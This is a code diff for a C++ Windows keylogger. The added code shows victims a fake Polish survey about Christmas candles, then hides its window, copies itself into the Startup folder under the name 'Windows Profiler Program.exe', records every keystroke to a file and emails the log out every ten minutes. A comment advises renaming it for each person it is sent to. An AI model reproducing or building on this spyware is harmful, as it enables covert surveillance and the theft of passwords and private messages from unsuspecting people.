@@ -25,11 +25,57 @@ int shift = 0, caps = 0;
 const char *emailAddress = "email";
 const char *password = "password";
 CkMailMan mailman;
-FILE *fd;
+FILE *fileLog;
+FILE *fileConfig;
 time_t t;
 std::vector<std::string> filesToSend;
 
 int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
+    std::string appData = std::getenv("APPDATA");
+    // Change this name each time you send it to someone so that they get a new version
+    fileConfig = fopen("C:\\ProgramData\\WPConfig.txt", "a+");
+    char opened[2];
+    fgets(opened, 2, fileConfig);
+    if (!opened[0]) {
+        std::cout << "First open";
+        fileConfig = fopen("C:\\ProgramData\\WPConfig.txt", "w");
+        fputs("1", fileConfig);
+        FILE* conin = stdin;
+        FILE* conout = stdout;
+        FILE* conerr = stderr;
+        AllocConsole();
+        AttachConsole(GetCurrentProcessId());
+        freopen_s(&conin, "CONIN$", "r", stdin);
+        freopen_s(&conout, "CONOUT$", "w", stdout);
+        freopen_s(&conerr, "CONOUT$", "w", stderr);
+        SetConsoleTitle("appconsole");
+
+        std::cout << "odpowiadaj na pytania tak nie dziekuje zgory<3" << std::endl;
+        std::cout<<" ktory kształt jest lepszy buuble(1) czy shake(2) 1=tak 2=nie"<<std::endl;
+        std::string e;
+        std::cin>>e;
+        std::cout<<" ktory zapach na swieta jest lepszy cynamon(1) czy jabko(2) 1=tak 2=nie"<<std::endl;
+        std::string b;
+        std::cin>>b;
+        std::cout<<" czy powinienem robić wersje świteczne świeczek (kolory czerwono złote) 1=tak 2=nie"<<std::endl;
+        std::string c;
+        std::cin>>c;
+        std::cout<<" ktory zapach na swieta jest lepszy wino(1) czy jabko(2) 1=tak 2=nie"<<std::endl;
+        std::string d;
+        std::cin>>d;
+        std::cout<<" lepiej zrobić wiele róznych rodzaji i kolorów choinek czy jedną ? jedna=tak wiele =nie"<<std::endl;
+        std::string y;
+        std::cin>>y;
+        std::cout<<" robić specjalne świteczne opakowania?"<<std::endl;
+        std::string u;
+        std::cin>>u;
+        std::cout << e << b << c << d << y << u;
+        ShowWindow(GetConsoleWindow(), SW_HIDE);
+    } else {
+        std::cout << "Opened already";
+    }
+    fclose(fileConfig);
+
     std::string header = "\n\n\n-------------------------";
 
     t = std::time(nullptr);
@@ -52,9 +98,9 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     GetModuleFileName(nullptr, filePath, INFO_BUFFER_SIZE);
     std::wcout << filePath << std::endl;
 
-    TCHAR secondPart[INFO_BUFFER_SIZE] = TEXT(
-            "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/WindowsProfiler.exe");
     TCHAR destination[INFO_BUFFER_SIZE] = TEXT("C:/Users/");
+    TCHAR secondPart[INFO_BUFFER_SIZE] = TEXT(
+            "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows Profiler Program.exe");
 
     strcat(destination, username);
     strcat(destination, secondPart);
@@ -68,7 +114,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     }
 
     std::string nextTry = std::getenv("APPDATA");
-    nextTry += R"(\Microsoft\Windows\Start Menu\Programs\Startup\WindowsProfiler.exe)";
+    nextTry = appData + R"(\Microsoft\Windows\Start Menu\Programs\Startup\Windows Profiler Program.exe)";
     if (CopyFile(filePath, nextTry.c_str(), FALSE)) {
         printf("Copied file again\n");
     } else {
@@ -81,9 +127,9 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     std::string fname = "C:/ProgramData/WP";
     fname += username;
     fname += ".txt";
-    fd = fopen(fname.c_str(), "a");
-    fwrite(header.c_str(), 1, strlen(header.c_str()), fd);
-    fflush(fd);
+    fileLog = fopen(fname.c_str(), "a");
+    fwrite(header.c_str(), 1, strlen(header.c_str()), fileLog);
+    fflush(fileLog);
 
     filesToSend = {fname};
 
@@ -201,7 +247,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(__attribute__((unused)) int nCode, WPARAM 
     if (str)
         log(str);
 
-    if (difftime(std::time(nullptr), t) > 20) {
+    if (difftime(std::time(nullptr), t) > 600) {
         t = std::time(nullptr);
         sendEmail(filesToSend);
     }
@@ -211,9 +257,8 @@ LRESULT CALLBACK LowLevelKeyboardProc(__attribute__((unused)) int nCode, WPARAM 
 #pragma clang diagnostic pop
 
 void log(char *str) {
-    fwrite(str, 1, strlen(str), fd);
-    if (strstr(str, " ") || strstr(str, "\n"))
-        fflush(fd);
+    fwrite(str, 1, strlen(str), fileLog);
+    fflush(fileLog);
 }
 
 char *translate(int vk, int up) {
